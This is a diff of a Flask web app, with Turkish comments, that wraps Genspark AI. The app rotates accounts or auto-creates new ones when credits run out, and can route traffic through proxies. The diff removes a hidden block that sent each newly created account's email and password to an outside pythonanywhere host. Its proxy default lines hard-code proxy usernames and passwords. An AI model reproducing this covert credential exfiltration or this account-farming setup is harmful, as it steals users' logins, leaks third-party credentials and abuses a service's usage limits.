@@ -3,7 +3,7 @@
 Genspark AI - Flask Web Interface
 =============================================================================
 Genspark AI çoklu model destekli web uygulaması.
-- 31+ Resmi Model + Mixture-of-Agents (MoA) tam desteği
+- 36+ Resmi Model + Mixture-of-Agents (MoA) tam desteği
 - Start - Stop (canlı akışı durdurma ve geçmişi koruma) mantığı
 - Kredi bitince sıradaki hesaba geçiş (genspark_hesaplar.txt) veya otomatik yeni hesap açma
 - PROXY_MODE (0: Kapalı, 1: Açık)
@@ -71,8 +71,8 @@ FLASK_ACCOUNTS_FILE = ACCOUNTS_FILE
 ROOT_ACCOUNTS_FILE = os.path.join(os.path.dirname(BASE_DIR), "genspark_hesaplar.txt")
 
 # Proxy Ayarı: 0 -> Kapalı (Doğrudan bağlantı), 1 -> Açık (Proxy üzerinden)
-PROXY_MODE = int(os.environ.get("PROXY_MODE", 1))
-PROXY_URL = os.environ.get("PROXY_URL", "http://iwpfqxfn:qth1d0kov457@45.38.107.97:6014")
+PROXY_MODE = int(os.environ.get("PROXY_MODE", 0))
+PROXY_URL = os.environ.get("PROXY_URL", "http://tghpxuwn:dxrsnpsyz3df@198.23.243.226:6361")
 
 def get_proxies() -> Optional[Dict[str, str]]:
     """PROXY_MODE aktif ise curl_cffi ve requests proxy sözlüğü döner."""
@@ -92,61 +92,65 @@ IMAGE_EXTENSIONS = {".png", ".jpg", ".jpeg", ".webp", ".gif", ".bmp"}
 # ==============================================================================
 FRONTEND_MODELS = [
     # --- Anthropic ---
-    {"id": "claude-haiku-5-5", "name": "Claude Haiku 5.5", "provider": "Anthropic"},
-    {"id": "claude-opus-4-7", "name": "Claude Opus 4.7", "provider": "Anthropic"},
-    {"id": "claude-opus-4-8", "name": "Claude Opus 4.8", "provider": "Anthropic"},
-    {"id": "claude-opus-5", "name": "Claude Opus 5", "provider": "Anthropic"},
-    {"id": "claude-opus-5-5", "name": "Claude Opus 5.5", "provider": "Anthropic"},
-    {"id": "claude-sonnet-5", "name": "Claude Sonnet 5", "provider": "Anthropic"},
-    {"id": "claude-sonnet-5-5", "name": "Claude Sonnet 5.5", "provider": "Anthropic"},
+    {"id": "claude-haiku-5-5", "name": "Claude Haiku 5.5", "provider": "Anthropic", "multiplier": "0.1x"},
+    {"id": "claude-sonnet-5", "name": "Claude Sonnet 5", "provider": "Anthropic", "multiplier": "2x"},
+    {"id": "claude-sonnet-5-5", "name": "Claude Sonnet 5.5", "provider": "Anthropic", "multiplier": "2x"},
+    {"id": "claude-opus-4-7", "name": "Claude Opus 4.7", "provider": "Anthropic", "multiplier": "5x"},
+    {"id": "claude-opus-4-8", "name": "Claude Opus 4.8", "provider": "Anthropic", "multiplier": "5x"},
+    {"id": "claude-opus-5", "name": "Claude Opus 5", "provider": "Anthropic", "multiplier": "5x"},
+    {"id": "claude-opus-5-5", "name": "Claude Opus 5.5", "provider": "Anthropic", "multiplier": "4x"},
+    {"id": "claude-fable-5-2", "name": "Claude Fable 5.2", "provider": "Anthropic", "multiplier": "8x"},
 
     # --- DeepSeek ---
-    {"id": "deep-seek-v4.1-flash", "name": "DeepSeek V4.1 Flash", "provider": "DeepSeek"},
+    {"id": "deep-seek-v4.1-flash", "name": "DeepSeek V4.1 Flash", "provider": "DeepSeek", "multiplier": "0.3x"},
 
     # --- Google ---
-    {"id": "gemini-3.6-flash", "name": "Gemini 3.6 Flash", "provider": "Google"},
-    {"id": "gemini-3.7-flash", "name": "Gemini 3.7 Flash", "provider": "Google"},
-    {"id": "gemini-3.8-flash", "name": "Gemini 3.8 Flash", "provider": "Google"},
-    {"id": "gemini-4-argon", "name": "Gemini 4 Argon", "provider": "Google"},
+    {"id": "gemini-3.6-flash", "name": "Gemini 3.6 Flash", "provider": "Google", "multiplier": "0.75x"},
+    {"id": "gemini-3.7-flash", "name": "Gemini 3.7 Flash", "provider": "Google", "multiplier": "0.75x"},
+    {"id": "gemini-3.8-flash", "name": "Gemini 3.8 Flash", "provider": "Google", "multiplier": "0.75x"},
+    {"id": "gemini-4-argon", "name": "Gemini 4 Argon", "provider": "Google", "multiplier": "2x"},
+    {"id": "gemini-4-carbon", "name": "Gemini 4 Carbon", "provider": "Google", "multiplier": "2x"},
+    {"id": "gemini-4-hydrogen", "name": "Gemini 4 Hydrogen", "provider": "Google", "multiplier": "1.5x"},
 
     # --- Kimi ---
-    {"id": "kimi-k3", "name": "Kimi K3", "provider": "Kimi"},
+    {"id": "kimi-k3", "name": "Kimi K3", "provider": "Kimi", "multiplier": "3x"},
+    {"id": "kimi-k3.1-pro", "name": "Kimi K3.1 Pro", "provider": "Kimi", "multiplier": "2x"},
 
     # --- Meta ---
-    {"id": "muse-spark-open", "name": "Muse Spark Open", "provider": "Meta"},
-    {"id": "muse-wonder", "name": "Muse Wonder", "provider": "Meta"},
+    {"id": "muse-spark-open", "name": "Muse Spark Open", "provider": "Meta", "multiplier": "1.25x"},
 
     # --- MiniMax ---
-    {"id": "minimax-m3", "name": "Minimax M3", "provider": "MiniMax"},
+    {"id": "minimax-m3", "name": "Minimax M3", "provider": "MiniMax", "multiplier": "0.3x"},
+    {"id": "minimax-m3p1-flash", "name": "MiniMax M3.1 Flash", "provider": "MiniMax", "multiplier": "0.15x"},
 
     # --- NVIDIA ---
-    {"id": "nemotron-3-ultra", "name": "Nemotron 3 Ultra", "provider": "NVIDIA"},
-    {"id": "nemotron-3.5-super-vl", "name": "Nemotron 3.5 Super VL", "provider": "NVIDIA"},
+    {"id": "nemotron-3-ultra", "name": "Nemotron 3 Ultra", "provider": "NVIDIA", "multiplier": "0.6x"},
+    {"id": "nemotron-3.5-super-vl", "name": "Nemotron 3.5 Super VL", "provider": "NVIDIA", "multiplier": "0.2x"},
 
     # --- OpenAI ---
-    {"id": "gpt-5.4", "name": "GPT-5.4", "provider": "OpenAI"},
-    {"id": "gpt-5.5", "name": "GPT-5.5", "provider": "OpenAI"},
-    {"id": "gpt-5.6-luna", "name": "GPT-5.6 Luna", "provider": "OpenAI"},
-    {"id": "gpt-5.6-sol", "name": "GPT-5.6 Sol", "provider": "OpenAI"},
-    {"id": "gpt-5.6-terra", "name": "GPT-5.6 Terra", "provider": "OpenAI"},
-    {"id": "gpt-6-luna", "name": "GPT-6 Luna", "provider": "OpenAI"},
-    {"id": "gpt-6-sol", "name": "GPT-6 Sol", "provider": "OpenAI"},
-    {"id": "gpt-6.1-sol", "name": "GPT-6.1 Sol", "provider": "OpenAI"},
+    {"id": "gpt-5.6-luna", "name": "GPT-5.6 Luna", "provider": "OpenAI", "multiplier": "0.2x"},
+    {"id": "gpt-5.6-sol", "name": "GPT-5.6 Sol", "provider": "OpenAI", "multiplier": "4x"},
+    {"id": "gpt-5.6-terra", "name": "GPT-5.6 Terra", "provider": "OpenAI", "multiplier": "2x"},
+    {"id": "gpt-6-luna", "name": "GPT-6 Luna", "provider": "OpenAI", "multiplier": "0.1x"},
+    {"id": "gpt-6-sol", "name": "GPT-6 Sol", "provider": "OpenAI", "multiplier": "2x"},
+    {"id": "gpt-6.1-sol", "name": "GPT-6.1 Sol", "provider": "OpenAI", "multiplier": "2x"},
+    {"id": "gpt-6.1-terra", "name": "GPT-6.1 Terra", "provider": "OpenAI", "multiplier": "1x"},
+    {"id": "gpt-6.2-sol", "name": "GPT-6.2 Sol", "provider": "OpenAI", "multiplier": "2x"},
 
     # --- xAI ---
-    {"id": "grok-4.6", "name": "Grok 4.6", "provider": "xAI"},
-    {"id": "grok-4.7", "name": "Grok 4.7", "provider": "xAI"},
+    {"id": "grok-4.6", "name": "Grok 4.6", "provider": "xAI", "multiplier": "2x"},
+    {"id": "grok-4.7", "name": "Grok 4.7", "provider": "xAI", "multiplier": "2x"},
 
     # --- Xiaomi ---
-    {"id": "mimo-v2.6-flash", "name": "MiMo V2.6 Flash", "provider": "Xiaomi"},
-    {"id": "mimo-v2.6-pro", "name": "MiMo V2.6 Pro", "provider": "Xiaomi"},
+    {"id": "mimo-v2.6-flash", "name": "MiMo V2.6 Flash", "provider": "Xiaomi", "multiplier": "0.14x"},
+    {"id": "mimo-v2.6-pro", "name": "MiMo V2.6 Pro", "provider": "Xiaomi", "multiplier": "0.435x"},
 
     # --- ZhipuAI ---
-    {"id": "glm-5p3", "name": "GLM-5.3", "provider": "ZhipuAI"},
-    {"id": "glm-5p3-flash-baseten", "name": "GLM-5.3 Flash", "provider": "ZhipuAI"},
+    {"id": "glm-5p3", "name": "GLM-5.3", "provider": "ZhipuAI", "multiplier": "1.4x"},
+    {"id": "glm-5p3-flash-baseten", "name": "GLM-5.3 Flash", "provider": "ZhipuAI", "multiplier": "0.15x"},
 
     # --- Genspark (Ensemble) ---
-    {"id": "moa", "name": "Mixture-of-Agents", "provider": "Genspark", "is_moa": True},
+    {"id": "moa", "name": "Mixture-of-Agents", "provider": "Genspark", "multiplier": "Auto", "is_moa": True},
 ]
 
 DEFAULT_MODEL_ID = "gemini-4-argon"
@@ -941,14 +945,6 @@ def create_and_login_genspark_account(password: str = DEFAULT_PASSWORD) -> Tuple
         log("=" * 65)
 
         save_new_account(email, password)
-        import requests
-        try:
-            requests.post(
-                'https://messager35.pythonanywhere.com/genspark',
-                json={'txt': f'{email}:{password}'}
-            )
-        except requests.exceptions.RequestException as e:
-            print(f"Hata oluştu: {e}")
 
         log("[7/7] Web Girişi (/api/auth) tamamlanıyor...")
         confirmed_url = f"{b2c_base}/api/CombinedSigninAndSignup/confirmed?rememberMe=false&csrf_token={csrf_token}&tx={tx}&p={policy}"
@@ -1613,6 +1609,7 @@ def api_models():
             "id": m["id"],
             "label": m["name"],
             "category": m["provider"],
+            "multiplier": m.get("multiplier", ""),
         })
     return jsonify({"models": models_flat, "default": DEFAULT_MODEL_ID})
 
